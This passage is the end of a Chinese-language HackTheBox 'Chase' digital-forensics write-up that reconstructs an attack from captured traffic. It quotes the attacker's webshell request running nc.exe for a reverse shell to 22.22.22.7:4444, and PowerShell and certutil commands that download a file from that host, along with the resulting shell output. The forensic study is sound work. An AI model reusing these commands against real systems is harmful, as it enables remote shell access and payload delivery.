class="hljs-variable">%2</span>FwEPDwUKLTk<span class="hljs-number">5</span>MjkzMTA<span class="hljs-number">5</span>MQ<span class="hljs-number">9</span>kFgICAQ<span class="hljs-number">9</span>kFgICCw<span class="hljs-number">8</span>PFgIeBFRleHQFaw<span class="hljs-number">0</span>KPHByZT<span class="hljs-number">4</span>qKioqICBPbmxpbmUgICoqKioNCiAgMDAwMCAgLi<span class="hljs-number">4</span>uDQogIGIwZDgNCkNlcnRVdGlsOiAtVVJMQ<span class="hljs-number">2</span>FjaGUgY<span class="hljs-number">29</span>tbWFuZCBjb<span class="hljs-number">21</span>wbGV<span class="hljs-number">0</span>ZWQgc<span class="hljs-number">3</span>VjY<span class="hljs-number">2</span>Vzc<span class="hljs-number">2</span>Z<span class="hljs-number">1</span>bGx<span class="hljs-number">5</span>Lg<span class="hljs-number">0</span>KPC<span class="hljs-number">9</span>wcmU<span class="hljs-variable">%2</span>BZGRk<span class="hljs-number">8</span>LGROcfmxzGiIEGxxlI<span class="hljs-number">6</span>IHeRdyA<span class="hljs-variable">%3</span>D&amp;__EVENTVALIDATION<span class="hljs-operator">=</span><span class="hljs-variable">%2</span>FwEWBAKQ<span class="hljs-number">5</span>ISyAgL<span class="hljs-number">71</span>d<span class="hljs-number">7</span>YCAKRuYD<span class="hljs-number">5</span>CALT<span class="hljs-variable">%2</span>Fr<span class="hljs-number">7</span>ABJjJbr<span class="hljs-variable">%2</span>Fu<span class="hljs-number">6</span>tvYS<span class="hljs-number">9</span>iG<span class="hljs-number">9</span><span class="hljs-keyword">x</span><span class="hljs-number">2</span>jvQ<span class="hljs-variable">%2</span>BMU<span class="hljs-number">8</span>CJ&amp;xpath<span class="hljs-operator">=</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%5</span>Cwindows<span class="hljs-variable">%5</span>Csystem<span class="hljs-number">32</span><span class="hljs-variable">%5</span>Ccmd.exe&amp;xcmd<span class="hljs-operator">=</span><span class="hljs-variable">%2</span>Fc+<span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%5</span>Cusers<span class="hljs-variable">%5</span>Cpublic<span class="hljs-variable">%5</span>Cnc.exe<span class="hljs-number">+22.22</span>.<span class="hljs-number">22.7</span><span class="hljs-number">+4444</span>+-e+cmd.exe&amp;Button<span class="hljs-operator">=</span>Run</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">/c+c:\users\public\nc.exe+22.22.22.7+4444+-e+cmd.exe&amp;Button=Run<br></code></pre></td></tr></table></figure>
+
+<p>他在建立反向shell。至此HTTP协议就完了。紧接着需要查看TCP流量，鉴于攻击者反弹的是4444端口，那我只需锁定4444端口的TCP流量即可：</p>
+<p><img src="https://www.worldisend.com/img/image-20220609153311443.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220609153311443"></p>
+<p>右键追踪TCP流即可：</p>
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bat">Microsoft Windows [Version <span class="hljs-number">6</span>.<span class="hljs-number">1</span>.<span class="hljs-number">7601</span>]<br>Copyright (c) <span class="hljs-number">2009</span> Microsoft Corporation.  All rights reserved.<br><span class="hljs-function"></span><br><span class="hljs-function">c:\<span class="hljs-title">windows</span>\<span class="hljs-title">system32</span>\<span class="hljs-title">inetsrv</span>&gt;<span class="hljs-title">whoami</span></span><br><span class="hljs-function"><span class="hljs-title">whoami</span></span><br><span class="hljs-function"><span class="hljs-title">iis</span> <span class="hljs-title">apppool</span>\<span class="hljs-title">defaultapppool</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">c</span>:\<span class="hljs-title">windows</span>\<span class="hljs-title">system32</span>\<span class="hljs-title">inetsrv</span>&gt;<span class="hljs-title">ipconfig</span></span><br><span class="hljs-function"><span class="hljs-title">ipconfig</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">Windows</span> <span class="hljs-title">IP</span> <span class="hljs-title">Configuration</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">Ethernet</span> <span class="hljs-title">adapter</span> <span class="hljs-title">Npcap</span> <span class="hljs-title">Loopback</span> <span class="hljs-title">Adapter</span>:</span><br><span class="hljs-function"></span><br><span class="hljs-function">   <span class="hljs-title">Connection</span>-<span class="hljs-title">specific</span> <span class="hljs-title">DNS</span> <span class="hljs-title">Suffix</span>  . : </span><br><span class="hljs-function">   <span class="hljs-title">Link</span>-<span class="hljs-title">local</span> <span class="hljs-title">IPv6</span> <span class="hljs-title">Address</span> . . . . . : <span class="hljs-title">fe80</span>::<span class="hljs-title">c519</span>:1<span class="hljs-title">c29</span>:36<span class="hljs-title">a3</span>:3<span class="hljs-title">f06</span>%14</span><br><span class="hljs-function">   <span class="hljs-title">Autoconfiguration</span> <span class="hljs-title">IPv4</span> <span class="hljs-title">Address</span>. . : 169.254.63.6</span><br><span class="hljs-function">   <span class="hljs-title">Subnet</span> <span class="hljs-title">Mask</span> . . . . . . . . . . . : 255.255.0.0</span><br><span class="hljs-function">   <span class="hljs-title">Default</span> <span class="hljs-title">Gateway</span> . . . . . . . . . : </span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">Ethernet</span> <span class="hljs-title">adapter</span> <span class="hljs-title">Local</span> <span class="hljs-title">Area</span> <span class="hljs-title">Connection</span>:</span><br><span class="hljs-function"><span class="hljs-title">skip</span>-------------------</span><br></code></pre></td></tr></table></figure>
+
+<p>攻击者收集了一些主机信息。紧接着攻击者调用了powershell内置的远程下载模块远程下载了一个txt文件到c:\users\public\file.txt：</p>
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bat"><span class="hljs-function">c:\&gt;<span class="hljs-title">powershell</span> -<span class="hljs-title">ep</span> <span class="hljs-title">bypass</span> -<span class="hljs-title">c</span> <span class="hljs-title">Invoke</span>-<span class="hljs-title">WebRequest</span> -<span class="hljs-title">Uri</span> <span class="hljs-title">http</span>://22.22.22.7/<span class="hljs-title">JBKEE62NIFXF6ODMOUZV6NZTMFGV6URQMNMH2IBA.txt</span> -<span class="hljs-title">OutFile</span> <span class="hljs-title">c</span>:\<span class="hljs-title">users</span>\<span class="hljs-title">public</span>\<span class="hljs-title">file.txt</span></span><br><span class="hljs-function"><span class="hljs-title">powershell</span> -<span class="hljs-title">ep</span> <span class="hljs-title">bypass</span> -<span class="hljs-title">c</span> <span class="hljs-title">Invoke</span>-<span class="hljs-title">WebRequest</span> -<span class="hljs-title">Uri</span> <span class="hljs-title">http</span>://22.22.22.7/<span class="hljs-title">JBKEE62NIFXF6ODMOUZV6NZTMFGV6URQMNMH2IBA.txt</span> -<span class="hljs-title">OutFile</span> <span class="hljs-title">c</span>:\<span class="hljs-title">users</span>\<span class="hljs-title">public</span>\<span class="hljs-title">file.txt</span></span><br><span class="hljs-function"><span class="hljs-title">The</span> <span class="hljs-title">term</span> &#x27;<span class="hljs-title">Invoke</span>-<span class="hljs-title">WebRequest</span>&#x27; <span class="hljs-title">is</span> <span class="hljs-title">not</span> <span class="hljs-title">recognized</span> <span class="hljs-title">as</span> <span class="hljs-title">the</span> <span class="hljs-title">name</span> <span class="hljs-title">of</span> <span class="hljs-title">a</span> <span class="hljs-title">cmdlet</span>, <span class="hljs-title">functio</span></span><br><span class="hljs-function"><span class="hljs-title">n</span>, <span class="hljs-title">script</span> <span class="hljs-title">file</span>, <span class="hljs-title">or</span> <span class="hljs-title">operable</span> <span class="hljs-title">program</span>. <span class="hljs-title">Check</span> <span class="hljs-title">the</span> <span class="hljs-title">spelling</span> <span class="hljs-title">of</span> <span class="hljs-title">the</span> <span class="hljs-title">name</span>, <span class="hljs-title">or</span> <span class="hljs-title">if</span> <span class="hljs-title">a</span> <span class="hljs-title">pa</span></span><br><span class="hljs-function"><span class="hljs-title">th</span> <span class="hljs-title">was</span> <span class="hljs-title">included</span>, <span class="hljs-title">verify</span> <span class="hljs-title">that</span> <span class="hljs-title">the</span> <span class="hljs-title">path</span> <span class="hljs-title">is</span> <span class="hljs-title">correct</span> <span class="hljs-title">and</span> <span class="hljs-title">try</span> <span class="hljs-title">again</span>.</span><br><span class="hljs-function"><span class="hljs-title">At</span> <span class="hljs-title">line</span>:1 <span class="hljs-title">char</span>:18</span><br><span class="hljs-function">+ <span class="hljs-title">Invoke</span>-<span class="hljs-title">WebRequest</span> &lt;&lt;&lt;&lt;  -<span class="hljs-title">Uri</span> <span class="hljs-title">http</span>://22.22.22.7/<span class="hljs-title">JBKEE62NIFXF6ODMOUZV6NZTMFGV6U</span></span><br><span class="hljs-function"><span class="hljs-title">RQMNMH2IBA.txt</span> -<span class="hljs-title">OutFile</span> <span class="hljs-title">c</span>:\<span class="hljs-title">users</span>\<span class="hljs-title">public</span>\<span class="hljs-title">file.txt</span></span><br><span class="hljs-function">    + <span class="hljs-title">CategoryInfo</span>          : <span class="hljs-title">ObjectNotFound</span>: (<span class="hljs-title">Invoke</span>-<span class="hljs-title">WebRequest:String</span>) [], <span class="hljs-title">C</span> </span><br><span class="hljs-function">   <span class="hljs-title">ommandNotFoundException</span></span><br><span class="hljs-function">    + <span class="hljs-title">FullyQualifiedErrorId</span> : <span class="hljs-title">CommandNotFoundException</span></span><br></code></pre></td></tr></table></figure>
+
+<p>但是它失误了，术语“Invoke-WebRequest”不是cmdlet、函数的名称N、脚本文件或可操作程序。检查名称的拼写，或pa，请验证路径是否正确，然后重试。可能是因为powershell版本的原因。紧接着攻击者用windows 白名单程序对其进行了下载：</p>
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bat"><span class="hljs-function">c:\&gt;<span class="hljs-title">certutil</span> -<span class="hljs-title">urlcache</span> -<span class="hljs-title">split</span> -<span class="hljs-title">f</span> <span class="hljs-title">http</span>://22.22.22.7/<span class="hljs-title">JBKEE62NIFXF6ODMOUZV6NZTMFGV6URQMNMH2IBA.txt</span> <span class="hljs-title">c</span>:\<span class="hljs-title">users</span>\<span class="hljs-title">public</span>\</span><br><span class="hljs-function"><span class="hljs-title">certutil</span> -<span class="hljs-title">urlcache</span> -<span class="hljs-title">split</span> -<span class="hljs-title">f</span> <span class="hljs-title">http</span>://22.22.22.7/<span class="hljs-title">JBKEE62NIFXF6ODMOUZV6NZTMFGV6URQMNMH2IBA.txt</span> <span class="hljs-title">c</span>:\<span class="hljs-title">users</span>\<span class="hljs-title">public</span>\</span><br><span class="hljs-function">****  <span class="hljs-title">Online</span>  ****</span><br><span class="hljs-function">  0000  ...</span><br><span class="hljs-function">  000<span class="hljs-title">b</span></span><br><span class="hljs-function"><span class="hljs-title">CertUtil</span>: -<span class="hljs-title">URLCache</span> <span class="hljs-title">command</span> <span class="hljs-title">FAILED</span>: 0<span class="hljs-title">x80070003</span> (<span class="hljs-title">WIN32</span>: 3)</span><br><span class="hljs-function"><span class="hljs-title">CertUtil</span>: <span class="hljs-title">The</span> <span class="hljs-title">system</span> <span class="hljs-title">cannot</span> <span class="hljs-title">find</span> <span class="hljs-title">the</span> <span class="hljs-title">path</span> <span class="hljs-title">specified</span>.</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">c</span>:\&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>至此攻击者就不再对服务器有任何的命令交互。经过分析研判，攻击者利用Web服务器弱认证key admin 上传aspx语言的webshell，并利用上传成功的webshell远程下载nc位于c:\users\public目录下，并执行与22.22.22.7：4444建立了反向链接的shell。在此之后只是又下载了一个JBKEE62NIFXF6ODMOUZV6NZTMFGV6URQMNMH2IBA.txt并将其输出保存到了c:\users\public\。这便是攻击者的攻击路线。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;JBKEE62NIFXF6ODMOUZV6NZTMFGV6URQMNMH2IBA&quot;</span>|<span class="hljs-built_in">base32</span> -d<br></code></pre></td></tr></table></figure>
+
+
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/HackTheBox/" class="category-chain-item">HackTheBox</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Digital-Forensics/">#Digital Forensics</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackTheBox-Chase</div>
+      <div>http://example.com/2022/10/06/HackTheBox-Chase/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Mosaic Theory</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 6, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-Canape/" title="HackTheBox-Canape">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HackTheBox-Canape</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-Devel/" title="HackTheBox-Devel">
+                        <span class="hidden-mobile">HackTheBox-Devel</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
